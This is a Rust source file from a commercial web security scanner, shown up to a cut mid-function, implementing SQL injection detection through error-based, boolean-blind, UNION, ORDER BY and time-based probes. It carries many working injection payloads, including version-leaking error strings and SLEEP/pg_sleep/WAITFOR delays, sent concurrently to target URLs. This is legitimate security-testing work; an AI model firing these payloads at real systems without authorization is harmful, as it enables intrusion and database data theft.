// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Enhanced SQL Injection Scanner Module
 * Unified context-aware SQLi detection combining error-based, boolean-based,
 * UNION-based, and time-based techniques
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary
 */
use crate::analysis::{
    Evidence, EvidenceType, Hypothesis, HypothesisEngine, HypothesisStatus, HypothesisType,
    ResponseHints,
};
use crate::http_client::{HttpClient, HttpResponse};
use crate::inference::{SideChannelAnalyzer, Confidence as InferenceConfidence};
use crate::payloads;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{
    Confidence, EndpointType, ParameterSource, ScanConfig, ScanContext, Severity, Vulnerability,
};
use crate::vulnerability::VulnerabilityDetector;
use anyhow::Result;
use futures::stream::{self, StreamExt};
use once_cell::sync::Lazy;
use regex::Regex;
use scraper::{Html, Selector};
use similar::TextDiff;
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use tracing::{debug, info, warn};

/// Maximum number of columns to test for UNION-based SQLi
const MAX_COLUMNS: usize = 20;

/// Compiled regex patterns for SQL error detection
static ORACLE_ERROR_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"ora-[0-9]{5}").unwrap()
});

static SQLITE_NEAR_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"near\s+"(select|insert|update|delete|union|from|where)""#).unwrap()
});

/// Regex patterns for normalization (strip dynamic content for baseline comparison)
static TIMESTAMP_ISO: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?").unwrap()
});

static TIMESTAMP_COMMON: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\d{1,2}/\d{1,2}/\d{2,4}\s+\d{1,2}:\d{2}(?::\d{2})?(?:\s*[AP]M)?").unwrap()
});

static HTML_COMMENTS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"<!--.*?-->").unwrap()
});

static WHITESPACE_NORMALIZE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\s+").unwrap()
});

/// False positive HTML selectors for context validation
static FP_SELECTORS: Lazy<Vec<Selector>> = Lazy::new(|| {
    vec![
        Selector::parse("article").unwrap(),
        Selector::parse("pre").unwrap(),
        Selector::parse("code").unwrap(),
        Selector::parse(".tutorial").unwrap(),
        Selector::parse(".example").unwrap(),
        Selector::parse(".post-content").unwrap(),
        Selector::parse(".comment").unwrap(),
        Selector::parse(".documentation").unwrap(),
        Selector::parse("[class*='highlight']").unwrap(),
        Selector::parse("[class*='language-']").unwrap(),
    ]
});

/// Database types detected from response analysis
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum DatabaseType {
    MySQL,
    PostgreSQL,
    MSSQL,
    Oracle,
    SQLite,
    Generic,
}

/// Injection context detected from parameter analysis
#[derive(Debug, Clone, PartialEq)]
pub enum InjectionContext {
    Numeric,     // id=123
    String,      // name='value'
    DoubleQuote, // value="test"
    Json,        // {"key":"value"}
    OrderBy,     // sort=column
    Limit,       // limit=10
    Unknown,
}

/// SQL injection technique
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum SqliTechnique {
    ErrorBased,
    BooleanBlind,
    UnionBased,
    TimeBasedBlind,
    StackedQueries,
    BinarySearchBlind,
    TimeBasedStatistical,
    SecondOrder,
    PostgresJsonOperator,
    EnhancedErrorBased,
}

/// Similarity level for baseline comparison
#[derive(Debug, Clone, PartialEq)]
pub enum SimilarityLevel {
    NearlyIdentical,    // >0.9 - Responses are essentially the same
    SlightlyDifferent,  // 0.7-0.9 - Minor differences (timestamps, session IDs)
    ModeratelyDifferent, // 0.5-0.7 - Noticeable differences
    VeryDifferent,      // <0.5 - Major structural differences
}

/// Multi-signal detection for high-confidence SQL injection detection
#[derive(Debug, Clone)]
pub struct DetectionSignals {
    pub has_specific_error_pattern: bool,
    pub database_type: Option<String>,
    pub context_is_error_output: bool,
    pub baseline_similarity: SimilarityLevel,
    pub status_code: u16,
}

/// Enhanced SQL injection scanner with unified detection engine
pub struct EnhancedSqliScanner {
    http_client: Arc<HttpClient>,
    detector: VulnerabilityDetector,
    confirmed_vulns: Arc<Mutex<HashSet<String>>>, // Thread-safe deduplication
}

/// Boolean payload pair for blind SQLi testing
#[derive(Clone)]
struct BooleanPayloadPair {
    true_payload: &'static str,
    false_payload: &'static str,
    db_type: DatabaseType,
    context: InjectionContext,
    description: &'static str,
}

impl EnhancedSqliScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self {
            http_client,
            detector: VulnerabilityDetector::new(),
            confirmed_vulns: Arc::new(Mutex::new(HashSet::new())),
        }
    }

    /// Scan a parameter for SQL injection vulnerabilities using all techniques
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        config: &ScanConfig,
        context: Option<&ScanContext>,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // ============================================================
        // MANDATORY AUTHORIZATION CHECK - CANNOT BE BYPASSED
        // ============================================================
        if !crate::license::verify_rt_state() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            warn!("SQLi scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        // Skip static content endpoints
        if let Some(ctx) = context {
            if matches!(ctx.endpoint_type, EndpointType::StaticContent) {
                debug!("[SQLi] Skipping static content endpoint");
                return Ok((Vec::new(), 0));
            }
        }

        // Smart parameter filtering - skip boolean flags and framework internals
        if ParameterFilter::should_skip_parameter(parameter, ScannerType::SQLi) {
            debug!("[SQLi] Skipping boolean/framework parameter: {}", parameter);
            return Ok((Vec::new(), 0));
        }

        debug!(
            "Testing parameter '{}' for SQL injection (unified scanner, priority: {}{})",
            parameter,
            ParameterFilter::get_parameter_priority(parameter),
            if let Some(ctx) = context {
                format!(
                    ", framework: {:?}, source: {:?}",
                    ctx.framework.as_deref().unwrap_or("Unknown"),
                    ctx.parameter_source
                )
            } else {
                String::new()
            }
        );

        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Get baseline response
        let baseline = match self.http_client.get(base_url).await {
            Ok(response) => response,
            Err(e) => {
                warn!("Failed to get baseline response: {}", e);
                HttpResponse {
                    status_code: 0,
                    body: String::new(),
                    headers: HashMap::new(),
                    duration_ms: 0,
                }
            }
        };

        // Detect database type and injection context
        let db_type = self.detect_database_type(&baseline).await;
        let injection_context = self
            .detect_injection_context(base_url, parameter, &baseline)
            .await;

        debug!(
            "Context analysis: DB={:?}, InjectionContext={:?}",
            db_type, injection_context
        );

        // Apply context-aware prioritization
        let priority_boost = self.get_context_priority_boost(context);
        if priority_boost > 0 {
            debug!("[SQLi] Context-aware priority boost: +{}", priority_boost);
        }

        // ============================================================
        // BAYESIAN HYPOTHESIS-GUIDED TESTING
        // ============================================================
        // Initialize hypothesis engine for intelligent test prioritization
        let mut hypothesis_engine = HypothesisEngine::new();

        // Extract parameter value from URL for hypothesis generation
        let param_value = self
            .extract_param_value(base_url, parameter)
            .unwrap_or_default();

        // Build response hints from baseline analysis
        let response_hints = ResponseHints {
            has_sql_keywords: baseline.body.to_lowercase().contains("select")
                || baseline.body.to_lowercase().contains("mysql")
                || baseline.body.to_lowercase().contains("postgresql")
                || baseline.body.to_lowercase().contains("sqlite"),
            has_error_messages: self.has_sql_error(&baseline),
            has_stack_trace: baseline.body.contains("at ") && baseline.body.contains("Exception"),
            has_path_disclosure: baseline.body.contains("/var/")
                || baseline.body.contains("C:\\")
                || baseline.body.contains("/home/"),
            reflects_input: baseline.body.contains(&param_value),
            timing_ms: baseline.duration_ms as u64,
            status_code: Some(baseline.status_code),
            content_type: baseline.headers.get("content-type").cloned(),
            body_length: baseline.body.len(),
            error_patterns: Vec::new(),
        };

        // Generate initial hypotheses based on parameter and response
        let hypotheses = hypothesis_engine.generate_hypotheses(
            parameter,
            &param_value,
            base_url,
            &response_hints,
        );

        debug!(
            "[SQLi] Generated {} hypotheses for parameter '{}' (SQLi prior: {:.2})",
            hypotheses.len(),
            parameter,
            hypotheses
                .iter()
                .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }))
                .map(|h| h.posterior_probability)
                .unwrap_or(0.0)
        );

        // Run hypothesis-guided testing before traditional scanning
        let (hypothesis_vulns, hypothesis_tests) = self
            .scan_hypothesis_guided(
                base_url,
                parameter,
                &baseline,
                &mut hypothesis_engine,
                config,
            )
            .await?;
        total_tests += hypothesis_tests;
        all_vulnerabilities.extend(hypothesis_vulns);

        // If hypothesis testing found high-confidence vulnerabilities, we can skip some techniques
        let skip_redundant_tests = hypothesis_engine
            .get_confirmed_hypotheses()
            .iter()
            .any(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }));

        if skip_redundant_tests {
            debug!("[SQLi] Hypothesis confirmed SQLi vulnerability - optimizing remaining tests");
        }

        // Early exit in fast mode if hypothesis testing found vulnerability
        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // ============================================================
        // TECHNIQUE 0: ARITHMETIC/BEHAVIORAL INJECTION (INSANE MODE)
        // Runs FIRST - catches SQLi that error-based misses
        // No error messages needed, just behavioral differences
        // ============================================================
        let (arithmetic_vulns, arithmetic_tests) = self
            .scan_arithmetic_injection(base_url, parameter, &baseline, config)
            .await?;
        total_tests += arithmetic_tests;
        all_vulnerabilities.extend(arithmetic_vulns);

        // If arithmetic found something, high confidence - can skip others in fast mode
        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 1: Error-based detection (fast, high confidence)
        let (error_vulns, error_tests) = self
            .scan_error_based(
                base_url,
                parameter,
                &baseline,
                &db_type,
                &injection_context,
                config,
                context,
            )
            .await?;
        total_tests += error_tests;
        all_vulnerabilities.extend(error_vulns);

        // Early exit in fast mode if vulnerability found
        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 2: Boolean-based blind SQLi (slower, reliable)
        let (boolean_vulns, boolean_tests) = self
            .scan_boolean_blind(
                base_url,
                parameter,
                &baseline,
                &db_type,
                &injection_context,
                config,
            )
            .await?;
        total_tests += boolean_tests;
        all_vulnerabilities.extend(boolean_vulns);

        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 3: UNION-based SQLi (data extraction)
        let (union_vulns, union_tests) = self
            .scan_union_based(
                base_url,
                parameter,
                &baseline,
                &db_type,
                &injection_context,
                config,
            )
            .await?;
        total_tests += union_tests;
        all_vulnerabilities.extend(union_vulns);

        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
            return Ok((all_vulnerabilities, total_tests));
        }

        // Technique 4: Time-based blind SQLi (slowest, most reliable for blind)
        let (time_vulns, time_tests) = self
            .scan_time_based(base_url, parameter, &db_type, &injection_context, config)
            .await?;
        total_tests += time_tests;
        all_vulnerabilities.extend(time_vulns);

        // Enhanced techniques (only in thorough/insane mode)
        if config.scan_mode.as_str() == "thorough" || config.scan_mode.as_str() == "insane" {
            // Technique 5: Binary search blind SQLi
            let (binary_vulns, binary_tests) = self
                .scan_binary_search_blind(
                    base_url,
                    parameter,
                    &baseline,
                    &db_type,
                    &injection_context,
                    config,
                )
                .await?;
            total_tests += binary_tests;
            all_vulnerabilities.extend(binary_vulns);

            // Technique 6: Time-based with statistical analysis
            let (stat_time_vulns, stat_time_tests) = self
                .scan_time_based_statistical(
                    base_url,
                    parameter,
                    &db_type,
                    &injection_context,
                    config,
                )
                .await?;
            total_tests += stat_time_tests;
            all_vulnerabilities.extend(stat_time_vulns);

            // Technique 7: PostgreSQL JSON operators (if PostgreSQL detected)
            if matches!(db_type, DatabaseType::PostgreSQL)
                || matches!(db_type, DatabaseType::Generic)
            {
                let (json_vulns, json_tests) = self
                    .scan_postgres_json_operators(
                        base_url,
                        parameter,
                        &baseline,
                        &injection_context,
                        config,
                    )
                    .await?;
                total_tests += json_tests;
                all_vulnerabilities.extend(json_vulns);
            }

            // Technique 8: Enhanced error-based SQLi
            let (enhanced_error_vulns, enhanced_error_tests) = self
                .scan_enhanced_error_based(
                    base_url,
                    parameter,
                    &baseline,
                    &db_type,
                    &injection_context,
                    config,
                )
                .await?;
            total_tests += enhanced_error_tests;
            all_vulnerabilities.extend(enhanced_error_vulns);

        }

        // ============================================================
        // TECHNIQUE 9: OOBZero INFERENCE ENGINE (ALWAYS RUNS)
        // Zero-infrastructure blind detection via multi-channel Bayesian inference
        //
        // Runs ALWAYS as final safety net because:
        // 1. Catches blind SQLi that ALL traditional techniques missed
        // 2. Can EXTRACT actual DB data as definitive proof (@@version, user(), etc)
        // 3. Uses 16 independent signal channels with Bayesian inference
        // 4. Provides negative evidence to confirm true negatives
        // 5. Only ~18-50 requests - worth it for zero false negatives
        //
        // Why always run (even if other techniques found SQLi)?
        // - Data extraction (extract_data_proof) provides DEFINITIVE confirmation
        // - Reduces false positives from error-based detection
        // - Probability of FP with 6 chars extraction: 1/281 trillion
        // - As good as OOB callbacks but zero infrastructure needed
        // ============================================================
        let (oobzero_vulns, oobzero_tests) = self
            .scan_oobzero_inference(base_url, parameter, &baseline, config)
            .await?;
        total_tests += oobzero_tests;
        all_vulnerabilities.extend(oobzero_vulns);

        Ok((all_vulnerabilities, total_tests))
    }

    /// Test POST request body for SQLi
    pub async fn scan_post_body(
        &self,
        url: &str,
        body_param: &str,
        existing_body: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing POST parameter '{}' for SQL injection", body_param);

        let scan_mode = config.scan_mode.as_str();
        let baseline = match self.http_client.post(url, existing_body.to_string()).await {
            Ok(response) => response,
            Err(e) => {
                warn!("Failed to get baseline POST response: {}", e);
                HttpResponse {
                    status_code: 0,
                    body: String::new(),
                    headers: HashMap::new(),
                    duration_ms: 0,
                }
            }
        };

        let db_type = self.detect_database_type(&baseline).await;
        let payloads = self.get_context_aware_payloads(&db_type, &InjectionContext::Json);
        let total_payloads = payloads.len();

        let mut vulnerabilities = Vec::new();
        let concurrent_requests = match scan_mode {
            "insane" => 200,
            "thorough" => 150,
            _ => 100,
        };

        let results = stream::iter(payloads)
            .map(|payload| {
                let url = url.to_string();
                let param = body_param.to_string();
                let body = existing_body.to_string();
                let client = Arc::clone(&self.http_client);
                let baseline_clone = baseline.clone();

                async move {
                    let test_body = body.replace(
                        &format!("\"{}\":", param),
                        &format!("\"{}\":\"{}\"", param, payload),
                    );

                    match client.post(&url, test_body.clone()).await {
                        Ok(response) => Some((payload, response, url, baseline_clone)),
                        Err(e) => {
                            debug!("POST request failed: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        for result in results {
            if let Some((payload, response, test_url, baseline)) = result {
                if let Some(vuln) = self
                    .detector
                    .detect_sqli(&test_url, body_param, &payload, &response, &baseline)
                {
                    if self.is_new_vulnerability(&vuln) {
                        info!(
                            "SQL injection in POST body: {} in parameter '{}'",
                            vuln.severity, body_param
                        );
                        vulnerabilities.push(vuln);
                    }
                }
            }
        }

        Ok((vulnerabilities, total_payloads))
    }

    /// Detect database type from response headers and error messages
    async fn detect_database_type(&self, response: &HttpResponse) -> DatabaseType {
        let body_lower = response.body.to_lowercase();
        let headers_str = format!("{:?}", response.headers).to_lowercase();

        // MySQL detection
        if body_lower.contains("mysql")
            || body_lower.contains("mariadb")
            || headers_str.contains("mysql")
        {
            debug!("Detected MySQL/MariaDB database");
            return DatabaseType::MySQL;
        }

        // PostgreSQL detection
        if body_lower.contains("postgresql")
            || body_lower.contains("psql")
            || body_lower.contains("pg_")
            || headers_str.contains("postgresql")
        {
            debug!("Detected PostgreSQL database");
            return DatabaseType::PostgreSQL;
        }

        // MSSQL detection
        if body_lower.contains("microsoft sql")
            || body_lower.contains("mssql")
            || body_lower.contains("sql server")
            || headers_str.contains("mssql")
        {
            debug!("Detected MSSQL database");
            return DatabaseType::MSSQL;
        }

        // Oracle detection
        if body_lower.contains("ora-")
            || body_lower.contains("oracle")
            || headers_str.contains("oracle")
        {
            debug!("Detected Oracle database");
            return DatabaseType::Oracle;
        }

        // SQLite detection
        if body_lower.contains("sqlite") {
            debug!("Detected SQLite database");
            return DatabaseType::SQLite;
        }

        debug!("Database type unknown, using generic payloads");
        DatabaseType::Generic
    }

    /// Detect injection context from URL and response behavior
    async fn detect_injection_context(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
    ) -> InjectionContext {
        // Check if parameter name suggests context
        let param_lower = param.to_lowercase();

        if param_lower.contains("id")
            || param_lower.contains("num")
            || param_lower.contains("count")
            || param_lower.contains("page")
        {
            return InjectionContext::Numeric;
        }

        if param_lower.contains("sort")
            || param_lower.contains("order")
            || param_lower.contains("orderby")
            || param_lower.contains("dir")
        {
            return InjectionContext::OrderBy;
        }

        if param_lower.contains("limit")
            || param_lower.contains("offset")
            || param_lower.contains("top")
        {
            return InjectionContext::Limit;
        }

        // Category/filter parameters often use ORDER BY internally
        if param_lower.contains("category")
            || param_lower.contains("cat")
            || param_lower.contains("filter")
            || param_lower.contains("type")
        {
            // Test if it's ORDER BY injectable by response behavior
            if let Some(ctx) = self.probe_order_by_context(url, param, baseline).await {
                return ctx;
            }
        }

        // Try to detect from URL structure
        if url.contains(&format!("{}=", param)) {
            let url_parts: Vec<&str> = url.split(&format!("{}=", param)).collect();
            if url_parts.len() > 1 {
                let value_part = url_parts[1].split('&').next().unwrap_or("");

                // Check if numeric
                if value_part.parse::<i64>().is_ok() {
                    return InjectionContext::Numeric;
                }
            }
        }

        // Default to string context
        InjectionContext::String
    }

    /// Probe ORDER BY context by testing response behavior
    /// Returns Some(OrderBy) if ORDER BY injection is detected via response differences
    async fn probe_order_by_context(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
    ) -> Option<InjectionContext> {
        // Test ORDER BY injection by comparing responses
        // Valid ORDER BY returns 200, invalid column number returns 500
        let test_payloads = [
            ("1--", true),     // Should succeed (column 1 usually exists)
            ("9999--", false), // Should fail (column 9999 unlikely to exist)
            ("1'--", false),   // String injection attempt - different error
        ];

        let baseline_status = baseline.status_code;
        let mut valid_count = 0;
        let mut error_count = 0;

        for (payload, expect_success) in test_payloads {
            let test_url = Self::build_test_url(url, param, payload);

            if let Ok(response) = self.http_client.get(&test_url).await {
                // Check for ORDER BY pattern: 200 OK for valid, 500 for invalid column
                if expect_success {
                    if response.status_code == 200 || response.status_code == baseline_status {
                        valid_count += 1;
                    }
                } else {
                    // Expect 500 Internal Server Error for invalid column
                    if response.status_code == 500
                        || response.status_code == 400
                        || self.has_sql_error(&response)
                    {
                        error_count += 1;
                    }
                }
            }
        }

        // If we get expected behavior (valid payload works, invalid fails)
        // this indicates ORDER BY context
        if valid_count >= 1 && error_count >= 1 {
            info!("[SQLi] Detected ORDER BY context via response behavior analysis");
            return Some(InjectionContext::OrderBy);
        }

        None
    }

    /// Get context-aware payloads based on detected database and injection context
    fn get_context_aware_payloads(
        &self,
        db_type: &DatabaseType,
        context: &InjectionContext,
    ) -> Vec<String> {
        let mut payloads = Vec::new();

        match context {
            InjectionContext::Numeric => {
                // Numeric context (no quotes needed)
                payloads.extend(vec![
                    " AND 1=1".to_string(),
                    " AND 1=2".to_string(),
                    " OR 1=1".to_string(),
                    " AND 1=0".to_string(),
                    " OR 1=0".to_string(),
                ]);
            }
            InjectionContext::String | InjectionContext::Unknown => {
                // String context (quotes required)
                payloads.extend(vec![
                    "' AND '1'='1".to_string(),
                    "' AND '1'='2".to_string(),
                    "' OR '1'='1".to_string(),
                    "\" AND \"1\"=\"1".to_string(),
                    "') AND ('1'='1".to_string(),
                ]);
            }
            InjectionContext::OrderBy => {
                // ORDER BY context - comprehensive column enumeration
                // Based on real-world exploitation (500 Internal Server Error vs 200 OK)
                payloads.extend(vec![
                    // Basic ORDER BY column enumeration
                    "1--".to_string(),
                    "1 ASC--".to_string(),
                    "1 DESC--".to_string(),
                    "2--".to_string(),
                    "3--".to_string(),
                    "4--".to_string(),
                    "5--".to_string(),
                    "8--".to_string(),
                    "10--".to_string(),
                    "15--".to_string(),
                    "20--".to_string(),
                    "50--".to_string(),
                    "100--".to_string(),
                    // Comment variations
                    "1#".to_string(),
                    "1/**/".to_string(),
                    "1;--".to_string(),
                    // Subquery in ORDER BY
                    "(SELECT 1)".to_string(),
                    "(SELECT 1)--".to_string(),
                    "(SELECT NULL)--".to_string(),
                    // Case-based ORDER BY injection
                    "(CASE WHEN 1=1 THEN 1 ELSE 2 END)--".to_string(),
                    "(CASE WHEN 1=2 THEN 1 ELSE 2 END)--".to_string(),
                    // IF-based ORDER BY (MySQL)
                    "IF(1=1,1,2)--".to_string(),
                    "IF(1=2,1,2)--".to_string(),
                    // Error-based via ORDER BY
                    "1,extractvalue(1,concat(0x7e,version()))--".to_string(),
                    "1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--".to_string(),
                    // Time-based ORDER BY
                    "1,(SELECT SLEEP(2))--".to_string(),
                    "1,IF(1=1,SLEEP(2),0)--".to_string(),
                    // UNION in ORDER BY context
                    "1 UNION SELECT NULL--".to_string(),
                    "1 UNION SELECT NULL,NULL--".to_string(),
                    // PostgreSQL specific
                    "1,(SELECT pg_sleep(2))--".to_string(),
                    // MSSQL specific
                    "1;WAITFOR DELAY '0:0:2'--".to_string(),
                ]);
            }
            _ => {
                // Default payloads
                payloads.extend(vec![
                    "'".to_string(),
                    "''".to_string(),
                    "' OR '1'='1".to_string(),
                ]);
            }
        }

        // Add database-specific payloads
        match db_type {
            DatabaseType::MySQL => {
                payloads.extend(vec![
                    "' AND SLEEP(0)#".to_string(),
                    "' OR 1=1#".to_string(),
                    "' UNION SELECT NULL#".to_string(),
                ]);
            }
            DatabaseType::PostgreSQL => {
                payloads.extend(vec![
                    "' AND pg_sleep(0)--".to_string(),
                    "' OR 1=1--".to_string(),
                    "' UNION SELECT NULL--".to_string(),
                ]);
            }
            DatabaseType::MSSQL => {
                payloads.extend(vec![
                    "'; WAITFOR DELAY '00:00:00'--".to_string(),
                    "' OR 1=1;--".to_string(),
                    "' UNION SELECT NULL;--".to_string(),
                ]);
            }
            DatabaseType::Oracle => {
                payloads.extend(vec![
                    "' OR 1=1||'".to_string(),
                    "' UNION SELECT NULL FROM DUAL||'".to_string(),
                ]);
            }
            _ => {}
        }

        payloads
    }

    /// Scan for error-based SQL injection
    async fn scan_error_based(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        injection_context: &InjectionContext,
        config: &ScanConfig,
        scan_context: Option<&ScanContext>,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing error-based SQLi");

        let payloads = if config.scan_mode.as_str() == "fast" {
            // Fast mode: minimal payloads
            self.get_context_aware_payloads(db_type, injection_context)
        } else {
            // Normal/thorough mode: comprehensive payloads
            let mut all_payloads = self.get_context_aware_payloads(db_type, injection_context);

            // Add framework-specific payloads if context is available
            if let Some(ctx) = scan_context {
                all_payloads.extend(self.get_framework_specific_payloads(ctx, injection_context));
            }

            all_payloads.extend(payloads::get_sqli_payloads(config.scan_mode.as_str()));
            all_payloads
        };

        let total_payloads = payloads.len();
        let mut vulnerabilities = Vec::new();
        let concurrent_requests = match config.scan_mode.as_str() {
            "insane" => 200,
            "thorough" => 150,
            _ => 100,
        };

        let results = stream::iter(payloads)
            .map(|payload| {
                let url = base_url.to_string();
                let param = parameter.to_string();
                let client = Arc::clone(&self.http_client);
                let baseline_clone = baseline.clone();

                async move {
                    // Build URL by replacing/adding the parameter with payload
                    let test_url = Self::build_test_url(&url, &param, &payload);

                    match client.get(&test_url).await {
                        Ok(response) => Some((payload, response, test_url, baseline_clone)),
                        Err(e) => {
                            debug!("Request failed for SQLi payload: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        for result in results {
            if let Some((payload, response, test_url, baseline)) = result {
                if let Some(vuln) = self
                    .detector
                    .detect_sqli(&test_url, parameter, &payload, &response, &baseline)
                {
                    if self.is_new_vulnerability(&vuln) {
                        info!(
                            "Error-based SQLi detected: {} in parameter '{}'",
                            vuln.severity, parameter
                        );
                        vulnerabilities.push(vuln);

                        if config.scan_mode.as_str() == "fast" {
                            break;
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, total_payloads))
    }

    /// Scan for boolean-based blind SQL injection
    async fn scan_boolean_blind(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing boolean-based blind SQLi");

        let payload_pairs = self.get_boolean_payload_pairs(db_type, context);
        let total_tests = payload_pairs.len() * 2;
        let mut vulnerabilities = Vec::new();

        for pair in payload_pairs {
            if config.scan_mode.as_str() == "fast" && !vulnerabilities.is_empty() {
                break;
            }

            let true_url = Self::build_test_url(url, param, pair.true_payload);
            let false_url = Self::build_test_url(url, param, pair.false_payload);

            let true_response = match self.http_client.get(&true_url).await {
                Ok(resp) => resp,
                Err(e) => {
                    debug!("True payload request failed: {}", e);
                    continue;
                }
            };

            let false_response = match self.http_client.get(&false_url).await {
                Ok(resp) => resp,
                Err(e) => {
                    debug!("False payload request failed: {}", e);
                    continue;
                }
            };

            if let Some(vuln) = self.analyze_boolean_responses(
                url,
                param,
                baseline,
                &true_response,
                &false_response,
                &pair,
            ) {
                if self.is_new_vulnerability(&vuln) {
                    info!("Boolean-based blind SQLi detected: {:?}", pair.db_type);
                    vulnerabilities.push(vuln);

                    if config.scan_mode.as_str() != "thorough"
                        && config.scan_mode.as_str() != "insane"
                    {
                        break;
                    }
                }
            }
        }

        Ok((vulnerabilities, total_tests))
    }

    /// Get boolean payload pairs based on context
    fn get_boolean_payload_pairs(
        &self,
        db_type: &DatabaseType,
        context: &InjectionContext,
    ) -> Vec<BooleanPayloadPair> {
        let mut pairs = Vec::new();

        match context {
            InjectionContext::Numeric => {
                pairs.push(BooleanPayloadPair {
                    true_payload: " AND 1=1",
                    false_payload: " AND 1=2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::Numeric,
                    description: "Numeric comparison",
                });
                pairs.push(BooleanPayloadPair {
                    true_payload: " OR 1=1",
                    false_payload: " OR 1=2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::Numeric,
                    description: "Numeric OR comparison",
                });
            }
            _ => {
                // String context payloads
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND '1'='1",
                    false_payload: "' AND '1'='2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::String,
                    description: "String comparison",
                });
                pairs.push(BooleanPayloadPair {
                    true_payload: "\" AND \"1\"=\"1",
                    false_payload: "\" AND \"1\"=\"2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::String,
                    description: "Double quote comparison",
                });
                pairs.push(BooleanPayloadPair {
                    true_payload: "') AND ('1'='1",
                    false_payload: "') AND ('1'='2",
                    db_type: DatabaseType::Generic,
                    context: InjectionContext::String,
                    description: "Parenthesis bypass",
                });
            }
        }

        // Database-specific pairs
        match db_type {
            DatabaseType::MySQL => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND 1=1#",
                    false_payload: "' AND 1=2#",
                    db_type: DatabaseType::MySQL,
                    context: InjectionContext::String,
                    description: "MySQL hash comment",
                });
            }
            DatabaseType::PostgreSQL => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND '1'='1'--",
                    false_payload: "' AND '1'='2'--",
                    db_type: DatabaseType::PostgreSQL,
                    context: InjectionContext::String,
                    description: "PostgreSQL comment",
                });
            }
            DatabaseType::MSSQL => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND 1=1;--",
                    false_payload: "' AND 1=2;--",
                    db_type: DatabaseType::MSSQL,
                    context: InjectionContext::String,
                    description: "MSSQL semicolon",
                });
            }
            DatabaseType::Oracle => {
                pairs.push(BooleanPayloadPair {
                    true_payload: "' AND '1'='1'||'",
                    false_payload: "' AND '1'='2'||'",
                    db_type: DatabaseType::Oracle,
                    context: InjectionContext::String,
                    description: "Oracle concatenation",
                });
            }
            _ => {}
        }

        pairs
    }

    /// Analyze boolean-based blind SQLi responses
    fn analyze_boolean_responses(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        true_response: &HttpResponse,
        false_response: &HttpResponse,
        pair: &BooleanPayloadPair,
    ) -> Option<Vulnerability> {
        let true_to_baseline = self.calculate_similarity(baseline, true_response);
        let false_to_baseline = self.calculate_similarity(baseline, false_response);
        let true_to_false = self.calculate_similarity(true_response, false_response);

        debug!(
            "Similarity: true/base={:.2}%, false/base={:.2}%, true/false={:.2}%",
            true_to_baseline * 100.0,
            false_to_baseline * 100.0,
            true_to_false * 100.0
        );

        let true_matches_baseline = true_to_baseline > 0.85;
        let false_differs_from_baseline = false_to_baseline < 0.70;
        let true_differs_from_false = true_to_false < 0.70;

        let is_vulnerable =
            true_matches_baseline && false_differs_from_baseline && true_differs_from_false;

        if is_vulnerable {
            let confidence = if true_to_baseline > 0.95 && false_to_baseline < 0.50 {
                Confidence::High
            } else if true_to_baseline > 0.90 && false_to_baseline < 0.60 {
                Confidence::Medium
            } else {
                Confidence::Low
            };

            let evidence = format!(
                "Boolean-based blind SQLi:\n\
